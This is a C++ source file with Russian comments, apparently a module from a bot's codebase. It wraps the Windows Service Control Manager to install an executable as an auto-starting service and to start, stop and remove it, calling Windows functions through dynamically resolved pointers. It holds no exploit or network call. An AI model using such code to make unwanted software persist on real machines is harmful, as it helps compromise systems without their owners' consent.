//---------------------------------------------------------------------------

#pragma hdrstop

#include "BotService.h"
//---------------------------------------------------------------------------

 
TService::TService()
{
	FManager  = (SC_HANDLE)pOpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	FService  = NULL;
	OpenFlags = SERVICE_ALL_ACCESS;
}
//----------------------------------------------------------------------------

TService::~TService()
{
	if (FService)
		pCloseServiceHandle(FService);

	if (FManager)
		pCloseServiceHandle(FManager);
}
//----------------------------------------------------------------------------


bool TService::Install(const char* ExeName)
{
	// Функция инсталирует сервис в системе
	Close();
	if (FManager && !STRA::IsEmpty(ExeName))
	{
		FService = (SC_HANDLE)pCreateServiceA(FManager,
								 Name.t_str(),
								 DisplayName.t_str(),
								 SERVICE_ALL_ACCESS,
								 BOT_SERVICE_TYPE,
								 SERVICE_AUTO_START,
								 SERVICE_ERROR_NORMAL,
								 ExeName,
								 NULL, NULL, NULL, NULL, NULL);
	}
	return FService != NULL;
}
//----------------------------------------------------------------------------


bool TService::Uninstall()
{
	// Функция деинсталирует сервис
	bool Result = false;
	if (FManager && !Name.IsEmpty())
	{
		if (!FService)
		{
			OpenFlags |= SERVICE_STOP | DELETE;
			Open();
        }

		if (FService)
		{
			Stop(15000);
			Result = (BOOL)pDeleteService(FService) != FALSE;
			Close();
		}
	}
	return Result;
}
//----------------------------------------------------------------------------

bool TService::Open()
{
	Close();
	if (!FService && FManager && !Name.IsEmpty())
	{
		FService = (SC_HANDLE)pOpenServiceA(FManager, Name.t_str(), OpenFlags);
	}
	return FService != NULL;
}
//----------------------------------------------------------------------------

void TService::Close()
{
	// Функция закрывает сервис
	// Соединение с менеджером остаётся открытым
	if (FService)
	{
		pCloseServiceHandle(FService);
		FService = NULL;
	}
}
//----------------------------------------------------------------------------

bool TService::Start()
{
	// Функция запускает сервис
	if (!FService) Open();

	return (BOOL)pStartServiceA(FService, 0, NULL) != FALSE;
}
//----------------------------------------------------------------------------

bool TService::Stop(DWORD Timeout)
{
	// Функция останавливает сервис
	if (!FService && !Open())
		return false;


	SERVICE_STATUS Status;

	// Проверяем не остановлен ли сервис
	if (!pQueryServiceStatus(FService, &Status))
		return false;

	if (Status.dwCurrentState == SERVICE_STOPPED)
		return true;

	// Оправляем команду на остановку сервиса
	// В текуще реализации остановки сервиса мы не проверяем
	// зависимые сервисы

	if (!pControlService(FService, SERVICE_CONTROL_STOP, &Status))
		return false;

	DWORD StartTime = (DWORD)pGetTickCount();

	// Ожидаем окончания
	while (Timeout && Status.dwCurrentState != SERVICE_STOPPED)
	{
		pSleep(Status.dwWaitHint);

		if (!pQueryServiceStatus(FService, &Status))
			return false;

		if ((DWORD)pGetTickCount() - StartTime > Timeout)
			break;
	}
	return Status.dwCurrentState == SERVICE_STOPPED;
}
//----------------------------------------------------------------------------




